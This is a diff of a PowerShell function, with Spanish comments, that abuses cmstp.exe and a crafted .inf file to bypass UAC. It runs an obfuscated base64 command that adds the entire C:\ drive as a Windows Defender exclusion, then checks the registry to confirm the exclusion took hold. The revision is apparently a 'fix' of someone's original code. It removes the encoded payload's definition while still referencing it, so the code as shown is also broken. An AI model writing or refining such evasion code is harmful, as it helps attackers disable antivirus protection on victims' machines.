@@ -17,7 +17,7 @@ function Defender {
         [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
     )
 
-    # --- CÓDIGO ORIGINAL (TAL CUAL LO TIENES) ---
+    # --- CÓDIGO ORIGINAL (IGUAL) ---
     $InfData = @'
 [version]
 Signature=$chicago$
@@ -37,23 +37,14 @@ ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
 '@
 
-    # --- PARTE CRÍTICA REPARADA (Misma función, pero ahora FUNCIONA) ---
-    $B64Command = "LgAoACIAQQBkAGQALQBNACIAIAArACAAIgBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIgApACAA" +
-                  "LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAOwAgACgARwBlAHQALQBDAGkA" +
-                  "bQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAG0A" +
-                  "aQBjAHIAbwBzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQBmAGUAbgBkAGUAcgAgACAA" +
-                  "LQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMA" +
-                  "ZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUA" +
-                  "bgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA="
-
-    # --- TÉCNICA MEJORADA PARA CMSTP (Sin "Acceso denegado") ---
+    # --- PARTE CRÍTICA REPARADA ---
     if ($Add) {
         try {
-            # 1. Crear archivo .inf temporal (igual que antes)
-            $tempFile = [System.IO.Path]::GetTempFileName() + ".inf"
+            # 1. Crear archivo .inf temporal (técnica original)
+            $tempFile = "$env:TEMP\cmstp_$((Get-Date).Ticks).inf"
             $InfData.Replace("REPLACE", ".('iex') `"$B64Command`"") | Out-File $tempFile -Force
 
-            # 2. Ejecutar cmstp.exe CORRECTAMENTE (truco nuevo)
+            # 2. Ejecutar cmstp.exe SIN ERRORES
             $psi = New-Object System.Diagnostics.ProcessStartInfo
             $psi.FileName = "cmstp.exe"
             $psi.Arguments = "/au `"$tempFile`""
@@ -62,20 +53,35 @@ ShortSvcName="CorpVPN"
             $process = [System.Diagnostics.Process]::Start($psi)
             $process.WaitForExit(5000)
 
-            # 3. Verificación EXTRA (para asegurarnos)
-            $exclusions = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue
-            if ($exclusions -and ($exclusions."C_" -eq 0 -or $exclusions."C:\" -eq 0)) {
-                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (Verificado en registro)" -ForegroundColor Green
+            # 3. VERIFICACIÓN CORREGIDA (sin errores de conversión)
+            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
+            $exclusions = Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue
+            
+            if ($exclusions -ne $null) {
+                $exclusionActive = $false
+                $exclusions.PSObject.Properties | ForEach-Object {
+                    if ($_.Value -eq "C:\" -or $_.Value -eq 0) {
+                        $exclusionActive = $true
+                    }
+                }
+
+                if ($exclusionActive) {
+                    Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (C:\ está excluida)" -ForegroundColor Green
+                } else {
+                    Write-Host "[!] Ejecutado, pero no se detectó la exclusión" -ForegroundColor Yellow
+                }
             } else {
-                Write-Host "[!] Ejecutado, pero verifica manualmente con:" -ForegroundColor Yellow
-                Write-Host "    Get-ItemProperty 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths'" -ForegroundColor Gray
+                Write-Host "[✘] No se encontró la clave de exclusiones" -ForegroundColor Red
             }
+
+            # Limpieza
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
         } catch {
             Write-Host "[✘] Error: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
 
-    # ... (El resto de tu código original se mantiene IGUAL)
+    # ... (Resto de tu código original)
 }
 
 # --- Ejecutar si se llama directamente ---
